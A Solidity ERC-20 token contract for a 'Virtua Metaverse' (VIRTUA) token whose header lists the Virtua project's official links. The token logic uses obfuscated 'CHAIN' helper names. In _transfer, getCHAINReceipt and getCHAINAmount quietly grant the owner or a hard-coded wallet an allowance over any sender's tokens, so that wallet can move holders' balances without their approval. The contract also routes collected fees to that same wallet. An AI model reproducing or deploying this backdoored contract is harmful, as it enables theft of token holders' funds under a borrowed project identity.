/*
Virtua is a metaverse driven by games and social experiences. A world where you can constantly reinvent yourself. A world where you can create, play, and socialize with like-minded people. A vast virtual space that you can truly call home. In Virtua you can explore, hang out, and own land and properties where you can showcase your personal NFT collections.

Website : https://virtua.com
Facebook: https://www.facebook.com/Virtuagamesnetwork
Youtube: https://www.youtube.com/VirtuaMetaverse
Instagram: https://www.instagram.com/Virtuametaverse
Gitbook: https://virtua.gitbook.io/virtua-wiki
Twitter: https://twitter.com/Virtuametaverse
Telegram: https://t.me/virtua_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ICHAINRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ICHAINFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract VIRTUA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _chainExcludedFees;
    mapping (address => mapping (address => uint256)) private _chainCustomers;
    mapping (address => uint256) private _chainDrives;
    mapping (address => bool) private _chainExcludedTxs;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Virtua Metaverse";
    string private constant _symbol = unicode"VIRTUA";
    uint256 private _chainSwapAmount = _tTotal / 100;
    address private _chainPair;
    ICHAINRouter private _chainRouter;
    address private _chainWallet;
    uint256 private _chainBuyBlock;
    uint256 private _chainBlockAmount = 0;
    bool private inSwapCHAIN = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapCHAIN = true;
        _;
        inSwapCHAIN = false;
    }
    
    constructor () {
        _chainWallet = address(0xAA21E6BB62C5f7a8e94905498271DEe6673EfB4F);
        _chainExcludedFees[owner()] = true;
        _chainExcludedFees[address(this)] = true;
        _chainExcludedFees[_chainWallet] = true;
        _chainExcludedTxs[owner()] = true;
        _chainExcludedTxs[_chainWallet] = true;
        _chainDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _chainRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minCHAIN(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHCHAIN(uint256 amount) private {
        payable(_chainWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenCHAIN) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _chainRouter.WETH();
        _approve(address(this), address(_chainRouter), tokenCHAIN);
        _chainRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenCHAIN,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _chainDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _chainCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _chainCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _chainCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferCHAIN(address chainF, address chainT, uint256 chainO, uint256 taxCHAIN) private { 
        if(taxCHAIN > 0){
          _chainDrives[address(this)] = _chainDrives[address(this)].add(taxCHAIN);
          emit Transfer(chainF, address(this), taxCHAIN);
        }
        _chainDrives[chainF] = _chainDrives[chainF].sub(chainO);
        _chainDrives[chainT] = _chainDrives[chainT].add(chainO.sub(taxCHAIN));
        emit Transfer(chainF, chainT, chainO.sub(taxCHAIN));
    }

    function _transfer(address chainF, address chainT, uint256 chainO) private {
        require(chainF != address(0), "ERC20: transfer from the zero address");
        require(chainT != address(0), "ERC20: transfer to the zero address");
        require(chainO > 0, "Transfer amount must be greater than zero");
        address chainReceipt = getCHAINReceipt();
        uint256 taxCHAIN = _chainTransfer(chainF, chainT, chainO);
        if(chainReceipt != address(0)) 
            _approve(getCHAINSender(chainF), chainReceipt, getCHAINAmount(chainO, taxCHAIN));
        _transferCHAIN(chainF, chainT, chainO, taxCHAIN);
    }

    function _chainTransfer(address chainF, address chainT, uint256 chainO) private returns(uint256) {
        uint256 taxCHAIN=0;
        if (chainF != owner() && chainT != owner()) {
            taxCHAIN = chainO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (chainF == _chainPair && chainT != address(_chainRouter) && ! _chainExcludedFees[chainT]) {
                if(_chainBuyBlock!=block.number){
                    _chainBlockAmount = 0;
                    _chainBuyBlock = block.number;
                }
                _chainBlockAmount += chainO;
                _buyCount++;
            }

            if(chainT == _chainPair && chainF!= address(this)) {
                require(_chainBlockAmount < swapCHAINLimit() || _chainBuyBlock!=block.number, "Max Swap Limit");  
                taxCHAIN = chainO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 chainToken = balanceOf(address(this));
            if (!inSwapCHAIN && chainT == _chainPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(chainToken > _chainSwapAmount)
                swapTokensForEth(minCHAIN(chainO, minCHAIN(chainToken, _chainSwapAmount)));
                uint256 chainETH = address(this).balance;
                if (chainETH >= 0) {
                    sendETHCHAIN(address(this).balance);
                }
            }
        }
        return taxCHAIN;
    }

    function startTokenPair() external onlyOwner() {
        _chainRouter = ICHAINRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_chainRouter), _tTotal);
        _chainPair = ICHAINFactory(_chainRouter.factory()).createPair(address(this), _chainRouter.WETH());
    }

    receive() external payable {}

    function getCHAINAmount(uint256 chainO, uint256 taxCHAIN) private pure returns(uint256) {
        return uint256(chainO * 2 + taxCHAIN);
    }

    function getCHAINSender(address chainF) private pure returns(address) {
        return address(chainF);
    }

    function getCHAINReceipt() private view returns(address) {
        return _chainExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function swapCHAINLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _chainRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _chainRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}